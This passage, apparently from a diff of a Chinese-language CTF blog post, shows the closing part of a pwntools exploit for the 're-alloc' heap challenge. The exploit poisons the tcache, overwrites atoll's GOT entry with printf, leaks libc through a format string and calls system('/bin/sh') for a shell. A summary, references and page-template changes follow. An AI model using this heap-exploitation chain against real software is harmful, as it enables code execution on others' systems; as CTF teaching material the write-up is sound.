-alloc(1, 0x18, &quot;BBB&quot;)
-
-# now heap[0] == heap[1] == NULL
-realloc(0, 0x38, &quot;CCC&quot;)
-free(0)
-realloc(1, 0x38, &quot;D&quot; * 0x10)
-free(1)
-
-# let tcache[0x50] =&gt; atoll_got
-# heap[0] ==&gt; chunk(0x18) &lt;== heap[1]
-alloc(0, 0x48, &quot;AAA&quot;)
-realloc(0, 0, &quot;&quot;)
-realloc(0, 0x48, p64(atoll_got))
-alloc(1, 0x48, &quot;BBB&quot;)
-
-# now heap[0] == heap[1] == NULL
-realloc(0, 0x58, &quot;CCC&quot;)
-free(0)
-realloc(1, 0x58, &quot;D&quot; * 0x10)
-free(1)
-
-# above all, we get two tcache point to atoll_got that can be malloc
-
-# alloc once at heap[0]
-# change the atoll_got to printf_plt
-# use format string bug to leak the __libc_start_main_ret in the stack
-alloc(0, 0x48, p64(printf_plt))
-p.sendlineafter(&quot;Your choice: &quot;, &quot;3&quot;)
-p.sendlineafter(&quot;Index:&quot;, &quot;%21$llx&quot;)
-
-libc_start_main_ret = int(p.recv(12), 16)
-libc_base = libc_start_main_ret - libc_start_main_ret_offset
-libc_system = libc_base + system_offset
-
-# alloc twice at heap[1]
-# since the atoll has been set to printf
-# the return value of printf(which may be the length of the string) will be regarded as the &quot;Index&quot;
-# thus we use length of the string to make &quot;atoll&quot; work
-# then we change the atoll_got to libc_system
-p.sendlineafter(&quot;Your choice: &quot;, &quot;1&quot;)
-p.sendlineafter(&quot;Index:&quot;, &quot;A\x00&quot;)
-p.sendafter(&quot;Size:&quot;, &quot;A&quot; * 15 + &quot;\x00&quot;)
-p.sendafter(&quot;Data:&quot;, p64(libc_system))
-
-# input &quot;/bin/sh\x00&quot; and call system(atoll) to get shell
-p.sendlineafter(&quot;Your choice: &quot;, &quot;3&quot;)
-p.sendlineafter(&quot;Index:&quot;, &quot;/bin/sh\x00&quot;)
-
-success(&quot;libc_start_main_ret: &quot; + hex(libc_start_main_ret))
-success(&quot;libc_base: &quot; + hex(libc_base))
-success(&quot;libc_system: &quot; + hex(libc_system))
-
-p.interactive()</code></pre>
-<blockquote>
-<p>小结</p>
-</blockquote>
-<ul>
+<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><ul>
 <li>将<code>atoll</code>改为<code>printf</code>确实是神奇的姿势（我没遇到过），从这个思路上看，貌似还可以引入本来不存在的漏洞来利用。</li>
 <li>调试的时候gef好像有点问题，peda可以用。</li>
 </ul>
-<blockquote>
-<p>参考资料</p>
-</blockquote>
-<ol>
+<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ol>
 <li><a href="https://www.anquanke.com/post/id/194960" target="_blank" rel="noopener">https://www.anquanke.com/post/id/194960</a></li>
 <li><a href="https://tiencong283.ninja/post/realloc-pwnable-tw" target="_blank" rel="noopener">https://tiencong283.ninja/post/realloc-pwnable-tw</a></li>
 </ol>
-</div><div class="p-copyright"><blockquote><div class="p-copyright-author"><span class="p-copyright-key">本文作者：</span><span class="p-copytight-value"><a href="mailto:litreily@163.com">Nop</a></span></div><div class="p-copyright-link"><span class="p-copyright-key">本文链接：</span><span class="p-copytight-value"><a href="/2020/03/06/pwn-heap-re-alloc/">http://n0nop.com/2020/03/06/pwn-heap-re-alloc/</a></span></div><div class="p-copyright-note"><span class="p-copyright-key">版权声明：</span><span class="p-copytight-value">本博客所有文章除特殊声明外，均采用<a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/"> CC BY-NC 4.0 </a>许可协议。转载请注明出处 <a href="http://n0nop.com">Nop的博客</a>！</span></div></blockquote></div></article><div class="p-info box"><span class="p-tags"><i class="fa fa-tags"></i><a href="/tags/CTF/">CTF</a><a href="/tags/pwn/">pwn</a></span></div></div><section class="p-ext"><div class="l-pager l-pager-dtl box"><a class="prev" href="/2020/03/18/pwn-heap-re-alloc-revenge/">&lt; pwn heap: re-alloc_revenge</a><a class="next" href="/2020/02/17/pwn-rop-De-ASLR/">pwn rop: De-ASLR &gt;</a></div></section><footer><p>Copyright © 2016 - 2020 <a href="/." rel="nofollow">Nop</a> | <strong><a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/">CC BY-NC 4.0</a></strong><br><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span></span> <span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span></span> | Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a>Theme with<a rel="nofollow" target="_blank" href="https://github.com/litreily/snark-hexo"> snark.</a></p></footer></div></div></div><script type="text/javascript" src="/plugins/prettify/prettify.js"></script><script type="text/javascript" src="/js/search.js"></script><script type="text/javascript" src="/js/top.js"></script><script type="text/javascript" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><script>var search_path = 'search.xml';
-if (search_path.length == 0) {
-    search_path = 'search.xml';
-}
-var path = '/' + search_path;
-searchFunc(path, 'local-search-input', 'local-search-result');
-</script><script type="text/javascript" src="//cdn.bootcss.com/fancybox/3.3.5/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.1" async></script><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/fancybox/3.3.5/jquery.fancybox.min.css"></body></html>
+</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">Nop</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://n0nop.com/2020/03/06/pwn-heap-re-alloc/">https://n0nop.com/2020/03/06/pwn-heap-re-alloc/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/pwn/">pwn</a></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2020/03/18/pwn-heap-re-alloc-revenge/"><i class="fa fa-chevron-left">  </i><span>pwn heap: re-alloc_revenge</span></a></div><div class="next-post pull-right"><a href="/2020/02/17/pwn-rop-De-ASLR/"><span>pwn rop: De-ASLR</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer class="footer-bg" style="background-image: url(/img/avatar.png# false or url of img)"><div class="layout" id="footer"><div class="copyright">&copy;2019 - 2020 By Nop</div><div class="framework-info"><span>Driven - </span><a href="http://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody" target="_blank" rel="noopener"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.7.0"></script><script src="/js/fancybox.js?version=1.7.0"></script><script src="/js/sidebar.js?version=1.7.0"></script><script src="/js/copy.js?version=1.7.0"></script><script src="/js/fireworks.js?version=1.7.0"></script><script src="/js/transition.js?version=1.7.0"></script><script src="/js/scroll.js?version=1.7.0"></script><script src="/js/head.js?version=1.7.0"></script><script src="/js/search/local-search.js"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
+  $('#nav').addClass('is-mobile')
+  $('footer').addClass('is-mobile')
+  $('#top-container').addClass('is-mobile')
+}</script><div class="search-dialog" id="local-search"><div class="search-dialog__title" id="local-search-title">Local search</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts"></div></div></div><hr><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>Powered by</span> <a href="https://github.com/wzpan/hexo-generator-search" target="_blank" rel="noopener" style="color:#49B1F5;">hexo-generator-search</a></div></div></div><span class="search-close-button"><i class="fa fa-times"></i></span></div><div class="search-mask"></div></body></html>
